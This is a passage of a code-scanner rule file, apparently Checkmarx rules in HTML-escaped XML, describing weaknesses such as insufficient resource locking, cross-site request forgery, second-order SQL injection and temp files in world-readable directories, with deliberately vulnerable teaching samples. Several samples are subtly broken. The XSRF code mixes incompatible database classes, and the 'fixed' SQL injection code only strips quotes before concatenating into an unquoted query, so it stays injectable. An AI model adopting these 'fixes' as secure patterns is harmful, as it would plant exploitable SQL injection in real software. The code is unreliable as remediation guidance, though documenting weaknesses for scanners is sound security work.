&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;413&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_413_Description" id="oc_413_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;A product does not sufficiently lock resources, in a way that
either (1) allows an attacker to simultaneously access those resources, or (2)
causes other errors that lead to a resultant weakness.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_413_Time of Introduction" id="oc_413_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_413_Applicable Platforms" id="oc_413_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_413_Potential Mitigations" id="oc_413_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Use a non-conflicting privilege scheme.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Use synchronization when locking a resource.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_413_Relationships" id="oc_413_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;411&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=411" target="_blank"&gt;Resource Locking Problems&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;667&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=667" target="_blank"&gt;Insufficient Locking&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;591&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=591" target="_blank"&gt;Sensitive Data Storage in Improperly Locked Memory&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_413_Taxonomy Mappings" id="oc_413_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Insufficient Resource Locking&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_413_Content History" id="oc_413_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;PLOVER&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships,
Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_586</key><name>Heuristic_XSRF</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could cause the victim to perform any action for which the victim is authorized, such as transferring funds from the victim&amp;#8217;s account to the attacker&amp;#8217;s. The action will be logged as being performed by the victim.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application performs some action that modifies database contents, based purely on HTTP request content, and does not require per-request renewed authentication (such as transaction authentication or a cryptographic form token), instead relying on browser or session authentication. This means that an attacker could use social engineering to cause a victim to click a link including a transaction request, and the application would trust the victim&amp;#8217;s browser and would perform the action. This type of attack is known as Cross-Site Request Forgery (XSRF or CSRF).&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Implement a standard or library anti-CSRF mechanism: preferably a built-in platform-provided mechanism or OWASP&amp;#8217;s CSRFGuard. Selective re-authentication or transaction authentication, such as with a cryptographic form token, is also acceptable.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
HttpRequest content is used in a database query without any validation of that content
      &lt;/h4&gt;&lt;pre&gt;

public class XSRF
{
        public void foo(SqliteConnection connection, HttpRequest Request)
        {
                string input = Request.QueryString["user"];
                string sql = "insert into Comments(comment) values (@user)";
                MySqlCommand cmd = new MySqlCommand(sql, connection);
            	cmd.Parameters.AddwithValue(@user, input);
            	connection.Open();
            	SqlDataReader reader = cmd.ExecuteReader();
        }
}



      &lt;/pre&gt;&lt;h4&gt;
The HttpRequest content is validated using AntiXsrfTokenKey
      &lt;/h4&gt;&lt;pre&gt;

public class XSRFFixed
{
        public void foo(SqliteConnection connection, AntiXsrf AntiXsrfTokenKey, HttpRequest Request)
        {
                string input = AntiXsrfTokenKey.Validate(Request.QueryString["user"]);
                string sql = "insert into Comments(comment) values (@user)";
                MySqlCommand cmd = new MySqlCommand(sql, connection);
            	cmd.Parameters.AddwithValue(@user, input);
            	connection.Open();
            	SqlDataReader reader = cmd.ExecuteReader();
        }

}



      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_580</key><name>Heuristic_2nd_Order_SQL_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could directly access all of the system's data. The attacker would be able to steal any sensitive information stored by the system (such as personal user details or credit cards), and possibly change or erase existing data.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application communicates with its database by sending a textual SQL query. The application creates the query by simply concatenating strings including data obtained from the database. Since that data may have been previously obtained from user input, and is neither checked for data type validity nor subsequently sanitized, the data could contain SQL commands that would be interpreted as such by the database.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all data, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Instead of concatenating strings: a. Use secure database components such as stored procedures, parameterized queries, and object bindings (for commands and parameters). b. An even better solution is to use an ORM library, such as EntityFramework, Hibernate, or iBatis.&lt;/li&gt;
&lt;li&gt;Restrict access to database objects and functionality, according to the Principle of Least Privilege.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application creates an SQL query using data obtained from a database
      &lt;/h4&gt;&lt;pre&gt;public class SecondOrderSQLInjection
{
        public void foo(SqlConnection connection, SqlDataAdapter DA)
        {
                DataSet DS = new DataSet();
                DA.Fill(ref DS, "UserName"); 
                SqlCommand command = new SqlCommand("SELECT * FROM Customers " + "WHERE UserName = " + DS[0]["UserName"].ToString(), connection);
                command.ExecuteNonQuery();
        }
}&lt;/pre&gt;&lt;h4&gt;
The data obtained from the database is checked for potentially malicious characters
      &lt;/h4&gt;&lt;pre&gt;class SecondOrderSQLInjectionFixed
{
        public void foo(SqlConnection connection, SqlDataAdapter DA)
        {
                DataSet DS = new DataSet();
                DA.Fill(ref DS, "UserName");
                string userName = DS[0]["UserName"].ToString().Replace("'", "");
                SqlCommand command = new SqlCommand("SELECT * FROM Customers " + "WHERE UserName = " + userName, connection);
                command.ExecuteNonQuery();
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;The application creates an SQL query using data obtained from a database&lt;/h4&gt;&lt;pre&gt;public class Second_Order_SQL_Injection {
	public static void sql(Connection con, String sqlStm) {
		try {
			Statement stmt = con.createStatement();
			ResultSet rs = stmt.executeQuery(sqlStm);
			String userName = rs.getString("USER_NAME");
			String newSqlStm = "Update USER set PASSWORD = '1234' where userName like " + userName;
			stmt.executeUpdate(newSqlStm);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}&lt;/pre&gt;&lt;h4&gt;The data obtained from the database is checked for potentially malicious characters&lt;/h4&gt;&lt;pre&gt;public class Second_Order_SQL_Injection_Fixed {
	public static void sql(Connection con, String sqlStm) {
		try {
			Statement stmt = con.createStatement();
			ResultSet rs = stmt.executeQuery(sqlStm);
			String userName = rs.getString("USER_NAME");
			userName = userName.replaceAll("'", "");
			String newSqlStm = "Update USER set PASSWORD = '1234' where userName like " + userName;
			stmt.executeUpdate(newSqlStm);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1661</key><name>Creation_of_Temp_File_in_Dir_with_Incorrect_Permissions</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Creation of Temporary File in Directory with Incorrect Permissions&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;379&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_379_Description" id="oc_379_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The software creates a temporary file in a directory whose
permissions allow unintended actors to determine the file's existence or
otherwise access that file.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;On some operating systems, the fact that the temporary file exists may be
apparent to any user with sufficient privileges to access that directory.
Since the file is visible, the application that is using the temporary file
could be known. If one has access to list the processes on the system, the
attacker has gained information about what the user is doing at that time.
By correlating this with the applications the user is running, an attacker
could potentially discover what a user's actions are. From this, higher
levels of security could be breached.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_379_Time of Introduction" id="oc_379_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_379_Applicable Platforms" id="oc_379_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_379_Common Consequences" id="oc_379_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Since the file is visible and the application which is using the temp
file could be known, the attacker has gained information about what the
user is doing at that time.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Likelihood of Exploit"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Likelihood of Exploit&lt;/div&gt;&lt;div name="oc_379_Likelihood of Exploit" id="oc_379_Likelihood of Exploit" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Low&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_379_Demonstrative Examples" id="oc_379_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example Languages: &lt;/span&gt;C and C++&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;FILE *stream; char tempstring[] = "String to be written";&lt;/div&gt;&lt;div style="font-size:90%;"&gt;if( (stream = tmpfile()) == NULL ) {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;perror("Could not open new temporary file\n");&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;return (-1);&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;div style="font-size:90%;"&gt;/* write data to tmp file */&lt;/div&gt;&lt;div style="font-size:90%;"&gt;/* ... */&lt;/div&gt;&lt;div style="font-size:90%;"&gt;_rmtmp();&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;In cygwin and some older unixes one can ls /tmp and see that this temp
file exists.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;try {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;File temp = File.createTempFile("pattern", ".suffix");&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;temp.deleteOnExit();&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;BufferedWriter out = new BufferedWriter(new
FileWriter(temp));&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;out.write("aString");&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;out.close();&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;div style="font-size:90%;"&gt;catch (IOException e) {&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;This temp file is readable by all users.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_379_Potential Mitigations" id="oc_379_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Requirements&lt;/p&gt;&lt;p&gt;Many contemporary languages have functions which properly handle this
condition. Older C temp file functions are especially
susceptible.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;Try to store sensitive tempfiles in a directory which is not world
readable -- i.e., per-user directories.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;Avoid using vulnerable temp file functions.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_379_Relationships" id="oc_379_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;376&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=376" target="_blank"&gt;Temporary File Issues&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;377&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=377" target="_blank"&gt;Insecure Temporary File&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td 